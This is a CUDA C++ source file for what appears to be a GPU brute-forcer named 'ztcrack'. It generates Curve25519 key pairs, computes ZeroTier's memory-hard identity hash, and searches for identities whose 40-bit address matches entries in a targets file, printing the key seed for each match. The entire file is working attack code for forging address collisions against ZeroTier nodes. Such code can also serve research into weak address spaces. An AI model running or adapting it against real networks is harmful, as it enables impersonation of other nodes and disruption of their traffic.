#include <iostream>
#include <math.h>
#include <Windows.h>

#include <cuda_profiler_api.h>

#include "sha5.cuh"
#include "bytes.cuh"
#include "salsa20.cuh"
#include "C25519.cuh"

__device__  __host__ void dump_hex(const void* data, size_t size) {
  char ascii[17];
  size_t i, j;
  ascii[16] = '\0';
  for (i = 0; i < size; i++) {
      printf("%02X ", ((unsigned char*)data)[i]);
      if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
          ascii[i % 16] = ((unsigned char*)data)[i];
      } else {
          ascii[i % 16] = '.';
      }
      if ((i+1) % 8 == 0 || i+1 == size) {
          printf(" ");
          if ((i+1) % 16 == 0) {
              printf("|  %s \n", ascii);
          } else if (i+1 == size) {
              ascii[(i+1) % 16] = '\0';
              if ((i+1) % 16 <= 8) {
                  printf(" ");
              }
              for (j = (i+1) % 16; j < 16; ++j) {
                  printf("   ");
              }
              printf("|  %s \n", ascii);
          }
      }
  }
}

#define ZT_IDENTITY_GEN_MEMORY 2097152
#define ZT_ADDRESS_LENGTH 5
#define ZT_IDENTITY_GEN_HASHCASH_FIRST_BYTE_LESS_THAN 17

__device__ static inline void _computeMemoryHardHash(const void *publicKey,unsigned int publicKeyBytes,void *digest,void *genmem)
{
	// Digest publicKey[] to obtain initial digest
  SHA512(digest,publicKey,publicKeyBytes);

	// Initialize genmem[] using Salsa20 in a CBC-like configuration since
	// ordinary Salsa20 is randomly seek-able. This is good for a cipher
	// but is not what we want for sequential memory-hardness.
	//memset(genmem,0,ZT_IDENTITY_GEN_MEMORY);
  memset(genmem,0x00,64); // should really only need to initialize the first 64 bytes...
 	Salsa20 s20(digest,(char *)digest + 32);
  s20.crypt20((char *)genmem,(char *)genmem,64);

  for(unsigned long i=64;i<ZT_IDENTITY_GEN_MEMORY;i+=64) {
		unsigned long k = i - 64;
  //  memcpy((char*)genmem+i,(char *)genmem+k,64);
		*((uint64_t *)((char *)genmem + i)) = *((uint64_t *)((char *)genmem + k));
		*((uint64_t *)((char *)genmem + i + 8)) = *((uint64_t *)((char *)genmem + k + 8));
		*((uint64_t *)((char *)genmem + i + 16)) = *((uint64_t *)((char *)genmem + k + 16));
		*((uint64_t *)((char *)genmem + i + 24)) = *((uint64_t *)((char *)genmem + k + 24));
		*((uint64_t *)((char *)genmem + i + 32)) = *((uint64_t *)((char *)genmem + k + 32));
		*((uint64_t *)((char *)genmem + i + 40)) = *((uint64_t *)((char *)genmem + k + 40));
		*((uint64_t *)((char *)genmem + i + 48)) = *((uint64_t *)((char *)genmem + k + 48));
		*((uint64_t *)((char *)genmem + i + 56)) = *((uint64_t *)((char *)genmem + k + 56)); 
		s20.crypt20((char *)genmem + i,(char *)genmem + i,64);
	}

	// Render final digest using genmem as a lookup table
	for(unsigned long i=0;i<(ZT_IDENTITY_GEN_MEMORY / sizeof(uint64_t));) {
		unsigned long idx1 = (unsigned long) (swapBytes(((uint64_t *)genmem)[i++]) % (64 / sizeof(uint64_t))) ;
		unsigned long idx2 = (unsigned long)(swapBytes(((uint64_t *)genmem)[i++]) % (ZT_IDENTITY_GEN_MEMORY / sizeof(uint64_t)));
		uint64_t tmp = ((uint64_t *)genmem)[idx2];
		((uint64_t *)genmem)[idx2] = ((uint64_t *)digest)[idx1];
		((uint64_t *)digest)[idx1] = tmp;
    s20.crypt20(digest,digest,64);
	}
}

__device__ int memcmp(const void * s1, const void * s2, size_t n) {
  if (n != 0) {
    const unsigned char * p1 = (const unsigned char *)s1, *p2 = (const unsigned char *)s2;
    do {
      if (*p1++ != *p2++)
        return (*--p1 - *--p2);
    } while (--n != 0);
  }
  
  return (0);
}

__device__ bool test(unsigned char * digest, void * targets, size_t len){
  size_t i = 0;
  for(i = 0; i < len; i=i+5){ // overflow, needs check to make sure len is divisible by 5
    if(memcmp((uint8_t *)targets+i, digest+59, 5) == 0 )
      return true;
  }
  return false;
}

__global__
void crack(void * targets, size_t target_len, bool benchmark)
{
  int index = threadIdx.x;
  int stride = blockDim.x;
  int block = blockIdx.x;
  int id = index+(block*stride);

  uint64_t max = 0xffffffffff / (gridDim.x*blockDim.x); // key space divided by each of us
  uint64_t mykey = (0xffffffffffffffff / (gridDim.x*blockDim.x)) * id; // this threads starting point
  unsigned char out[64];
  memset(out, 0x00, sizeof(out));

  char * genmem = (char *)malloc(ZT_IDENTITY_GEN_MEMORY);
  C25519::Pair kp;
  uint8_t * priv = (uint8_t *)kp.priv.data;
  memset(priv, 0x00,ZT_C25519_PRIVATE_KEY_LEN);

  uint64_t i = 0;
  uint64_t attempt = i;
  uint64_t key = 0;

  if(benchmark){
    // Run through 5 loops and bail
    for(i = 0; i < 5; i++){
      do {
        key = mykey+attempt;
        // Bump the bruteforcer forward one byte to deal with C25519 clamping 
        memcpy(priv+2, &key, sizeof(uint64_t));
        C25519::calcPubKeys(&kp);
        _computeMemoryHardHash(kp.pub.data, ZT_C25519_PUBLIC_KEY_LEN, out, genmem);
        attempt++;
      } while(!(out[0] < ZT_IDENTITY_GEN_HASHCASH_FIRST_BYTE_LESS_THAN));
    }
  }
  else {
    for(i = 0; i < max; i++){
      do {
        key = mykey+attempt;
        // Bump the bruteforcer forward one byte to deal with C25519 clamping
        memcpy(priv+2, &key, sizeof(uint64_t));
        C25519::calcPubKeys(&kp);
        _computeMemoryHardHash(kp.pub.data, ZT_C25519_PUBLIC_KEY_LEN, out, genmem);
        attempt++;
      } while(!(out[0] < ZT_IDENTITY_GEN_HASHCASH_FIRST_BYTE_LESS_THAN));

      if(test(out, targets, target_len)){
        printf("key: %llu, address: %02hx%02hx%02hx%02hx%02hx\n", key, (uint8_t)out[59], (uint8_t)out[60], (uint8_t)out[61], (uint8_t)out[62], (uint8_t)out[63]);
      }
    }
  }
  free(genmem);
}

int main(int argc, char ** argv)
{

  if(argc<=3) {
    printf("needs thread, block and heap size (in mb) args. ./ztcrack <blocks> <threads> <heap>");
    exit(1);
  }  
 
  int blocks = atoi(argv[1]);  
  int threads = atoi(argv[2]);
  int heap = atoi(argv[3]);

  const size_t malloc_limit = size_t(heap) * size_t(1024) * size_t(1024);
  printf("Setting heap size to %zu\n",malloc_limit);
  cudaDeviceSetLimit(cudaLimitMallocHeapSize, malloc_limit); 

  FILE * fp;
  if((fp = fopen("targets.dat", "rb"))== NULL){
      printf("[!] Error: Could not open file targets.dat: %s\n", strerror(errno));
      printf("[!] Running in benchmark mode\n");      
      printf("Running %d threads and %d blocks. Total %d\n", threads, blocks, threads*blocks);
      
      crack<<<blocks, threads>>>(0x00, 0x00, true);
  }
  else {
  
    size_t bufsize;
    void * targets;
    
    if (fseek(fp, 0L, SEEK_END) == 0) {
        long ft = ftell(fp);
        if (ft == -1){
          printf("[!] Error with ftell: %s", strerror(errno));
          return 1;
        }
        else if(ft == 0){ // handle empty file
          printf("empty file");
          return 1;
        }
        bufsize = ft;
        printf("bufsize: %zu\n", bufsize);
        // Go back to the start of the file.
        if (fseek(fp, 0L, SEEK_SET) != 0){
          printf("[!] Error: could not fseek: %s\n", strerror(errno));
          return 1;
        }

        // Read the entire file into memory.
        void * file = malloc(bufsize);
        size_t r = fread(file, 1, bufsize, fp);
        printf("read: %zu\n", r);
      
        if ( ferror( fp ) != 0 ){
          printf("[!] Error: fread: %s\n", strerror(errno));
          return 1;
        }

        cudaMallocManaged(&targets, bufsize*sizeof(uint8_t));
        memcpy(targets, file, bufsize);
        
        printf("Running %d threads and %d blocks. Total %d\n", threads, blocks, threads*blocks);

        crack<<<blocks, threads>>>((uint8_t *)targets, bufsize, false);
    }
    else{
      printf("fseek");
      return 1;
    }

    fclose(fp);
  }
  
  // Wait for GPU to finish before accessing on host
  cudaDeviceSynchronize();

  cudaError_t err = cudaGetLastError();
  if (err != cudaSuccess) std::cout << "CUDA error: " << cudaGetErrorString(err) << std::endl; 
  cudaProfilerStop();
  return 0;
}